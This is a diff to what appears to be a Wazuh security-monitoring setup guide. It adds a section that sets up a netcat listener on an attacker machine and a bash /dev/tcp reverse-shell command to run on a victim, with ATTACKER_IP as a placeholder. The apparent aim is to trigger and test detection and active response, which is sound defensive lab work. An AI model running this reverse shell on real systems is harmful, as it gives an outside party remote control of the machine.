@@ -758,6 +758,19 @@ Restart the agent:
 
 Control the audit logs from dashboard: Wazuh Explore -> Discover, Add Filter -> ```location: /var/log/audit/audit.log```
 
+**Reverse Shell and Active Response:**
+
+Listen on Attacker Machine:
+```bash
+sudo apt install netcat
+nc -nlvp 4444
+```
+
+On Victim, It opens a reverse shell by making Bash connect to your listener and sending all input/output over that TCP connection:
+```
+bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1
+```
+
 
 Chain rule and groups
 ```xml
